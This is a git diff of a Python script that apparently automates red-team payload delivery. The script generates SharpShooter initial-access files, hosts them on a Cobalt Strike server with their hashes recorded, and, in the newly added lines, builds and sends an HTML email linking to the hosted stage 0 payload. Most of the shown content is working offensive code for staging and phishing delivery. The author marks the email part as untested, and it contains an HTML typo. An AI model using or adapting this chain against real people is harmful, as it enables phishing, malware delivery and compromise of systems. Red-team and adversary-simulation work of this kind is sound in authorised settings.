@@ -2,8 +2,8 @@
 
 # This is an example to automate some of the actions necessary to run sharpshooter more efficiently 
 
-from Striker import CSConnector
-from Artifactor import getHashes
+from payload_automation.striker import CSConnector
+from payload_automation.artifactor import getHashes
 import subprocess
 
 import smtplib
@@ -74,11 +74,14 @@ with CSConnector(
 
 	subprocess.run(ss_cmd.split(), cwd=sharpshooter_path)
 
+
 	# Then we connect to cobalt strike and host all of the files
 	# If smuggling is enabled, we don't need to host the hta
 	stage = 0
+	stage_0_uri = ""
 	for filetype in ['html', 'xsl']:
 		file = "{}/output/{}.{}".format(sharpshooter_path, prefix, filetype)
+
 		md5, sha1, sha256 = getHashes(file)
 		if filetype == 'html':
 			mime_type='text/html'
@@ -89,6 +92,23 @@ with CSConnector(
 		 				mime_type=mime_type,
 		 				description="Initial Access - Stage {} ({}) - MD5:{},SHA1:{},SHA256:{}".format(stage, filetype.upper(), md5, sha1, sha256))
 		print("hosted stage {} at {}".format(stage, hosted_uri))
+		if stage == 0:
+			stage_0_uri = hosted_uri
 		stage += 1
 
 	# WARNING, UNTESTED CODE BELOW!
+
+	email_body = """
+	<HTML>
+	<HEAD>
+	<TITLE> SharpShooter XLS HTA with Cobalt Strike Test </TITLE>
+	</HEAD>
+	<BDOY>
+	Please find the example <a href="{}"> here </a>
+	</BODY>
+	</HTML>
+	""".format(stage_0_uri)
+
+	msg = Create_Message("sender@example.com", "Recipient@example.com", "SharpShooter XLS HTA with Cobalt Strike Test", email_body)
+
+	Send_Email(msg, "mx.example.com")
